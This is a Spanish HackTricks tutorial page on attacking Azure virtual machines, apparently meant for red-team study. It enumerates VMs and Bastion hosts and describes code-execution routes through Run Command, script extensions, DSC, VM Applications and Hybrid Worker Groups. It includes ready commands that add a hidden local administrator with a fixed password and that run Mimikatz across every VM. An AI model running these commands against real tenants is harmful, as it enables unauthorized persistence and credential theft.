# Az - Máquinas Virtuales y Red

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información básica

Las máquinas virtuales de Azure son uno de los varios tipos de [recursos informáticos escalables y bajo demanda](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) que ofrece Azure. Típicamente, eliges una máquina virtual cuando necesitas más control sobre el entorno informático que las otras opciones ofrecen. Este artículo te proporciona información sobre lo que debes considerar antes de crear una máquina virtual, cómo crearla y cómo gestionarla.

## Información de la Red de Azure

Las redes de Azure contienen **diferentes entidades y formas de configurarlas.** Puedes encontrar **descripciones breves,** **ejemplos** y comandos de **enumeración** de las diferentes entidades de la red de Azure en:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** es un servicio completamente gestionado que proporciona **acceso RDP** (Protocolo de Escritorio Remoto) y **SSH** (Secure Shell) **seguro y sin interrupciones** a tus **máquinas virtuales directamente en el portal de Azure a través de SSL**. Este servicio es una alternativa más segura y conveniente a **exponer tus máquinas virtuales a conexiones de Internet públicas**. Azure Bastion se aprovisiona dentro de tu Red Virtual de Azure, proporcionando conectividad RDP y SSH a todas las VMs en la VNet usando direcciones IP privadas, lo que significa que no necesitas asignar direcciones IP públicas a tus VMs de Azure.

Así que si tu empresa tiene varias VMs alojadas dentro de una VNet de Azure para desarrollo y pruebas. **En lugar de configurar direcciones IP públicas y gestionar reglas NSG** para cada VM para habilitar el acceso RDP o SSH, **implementas Azure Bastion**. Con Azure Bastion, tus desarrolladores y personal de TI pueden **acceder a estas VMs desde el portal de Azure usando sus navegadores web de forma segura** sin la necesidad de direcciones IP públicas.

Para listar todos los Hosts de Azure Bastion en tu suscripción, puedes usar el siguiente comando:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
## Enumeración de VM
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Ejecutar comandos en una VM**

### **Inicio de sesión AAD en VM**

Es posible permitir el acceso a usuarios autenticados a través de AzureAD. Por ejemplo, al intentar acceder a una **VM linux**: `ssh username@azure-corp.com@1.1.1.1` (es importante **usar el correo electrónico** con el azurecorp utilizado al intentar iniciar sesión) podrías obtener un error como:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Solo **sigue esas instrucciones** yendo a [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) e indicando el código, usa el correo electrónico y la contraseña como credenciales y podrás conectarte vía SSH (si ese usuario tiene suficientes permisos para hacerlo: rol de `Virtual Machine Administrator Login` o `Virtual Machine User Login`).

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Ejecutar Extensión de Script Personalizado**

Las extensiones de máquina virtual (VM) de Azure son **pequeñas aplicaciones** que proporcionan configuración post-despliegue y **tareas** de automatización en **VMs de Azure**. Por ejemplo, si una máquina virtual requiere instalación de software, protección antivirus o la capacidad de ejecutar un script dentro de ella, puedes usar una extensión de VM.

Por lo tanto, si tienes acceso para escribir en ella, puedes ejecutar código arbitrario:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState

**DesiredConfigurationState (DSC)** es similar a Ansible, pero es una herramienta dentro de PowerShell que permite configurar un host a través de código. DSC tiene su propia extensión en Azure que permite la subida de **archivos de configuración**. Los [archivos de configuración](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document) de DSC son bastante exigentes en cuanto a la sintaxis, sin embargo, la extensión de DSC es muy crédula y **ejecutará ciegamente cualquier comando** siempre y cuando siga un cierto formato, como se muestra en la figura 5.

<figure><img src="../../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Esto se puede hacer a través de la función **Az PowerShell** [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0). La extensión DSC requiere un **.PS1** con una **función** y **empaquetado** en un archivo **.zip**. Dado que esto en realidad no es una sintaxis DSC correcta, el estado de la extensión se leerá como "fallo", sin embargo, el código se ejecutará. El problema con esto es que no hay salida del comando, ya que el estado se sobrescribe con el mensaje de fallo.

### VM Application Definitions

El recurso [VM Applications](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) es una forma de **desplegar aplicaciones versionadas de manera repetible** en una VM de Azure. Por ejemplo, si creas un **programa** y lo **despliegas** en todas las VMs de Azure como la versión 1.0, una vez que **actualices** el programa **a 1.1**, puedes usar la misma VM Application para **crear otra definición** y enviar la actualización a cualquier VM.\
Ser capaz de **desplegar una aplicación** en una VM significa que es otra vía para la **ejecución de código**. El inconveniente de este método es que configurar la Definición de la Aplicación [**requiere varios pasos**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal), pero se puede lograr utilizando los cmdlets **`New-AzGalleryApplication`** y **`New-AzGalleryApplicationVersion`** en Az PowerShell.

Esta técnica funciona utilizando una **extensión "VMAppExtension"** que se instala automáticamente al aplicar una aplicación a una VM. La extensión descarga el archivo desde el URI al disco con el nombre de la Aplicación _exactamente_, lo que significa que si el nombre de la aplicación es 'AzApplication', el archivo en el disco también se llama 'AzApplication' sin extensión. Esto requiere que el campo "ManageActions" en la [llamada a la API REST](https://docs.microsoft.com/en-us/rest/api/compute/gallery-application-versions/create-or-update) esté configurado para renombrar la aplicación con la extensión apropiada. Si no deseas ejecutar una aplicación completa, se pueden ejecutar comandos de PowerShell arbitrarios abusando también del campo ManageActions en el mismo método de la API REST o también a través del Portal de Azure. Una vez configurado, la definición será similar a la figura 8.

<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

Esta técnica de ejecución es lamentablemente lenta (unos 3-4 minutos para ejecutar una aplicación o comando), sin embargo, al ser relativamente nueva, me sorprendería si hay detecciones específicas escritas.

Dado que es una extensión la que finalmente realiza la ejecución, una copia de la aplicación se encuentra en `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` y el estado de la ejecución se mantiene en `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`.

### Hybrid Worker Groups

Los [**Hybrid Worker Groups**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) (HWGs) permiten que un **Runbook** configurado en una Cuenta de Automatización se **ejecute** en una **máquina virtual de Azure** que forma parte del **HWG configurado**. Una vez más, se utiliza una **extensión** en la VM para desplegar el código del Runbook en la VM. Dado que se utiliza una extensión, las credenciales son irrelevantes y el código se ejecuta como **SYSTEM** o root.

<figure><img src="../../../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

Si se utiliza una VM de Windows 10, es importante que el Runbook se ejecute como PowerShell Versión 5.1 en lugar de 7.1, ya que 7.1 no está instalado por defecto en las VMs y el script fallará al ejecutarse.

## Referencias

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
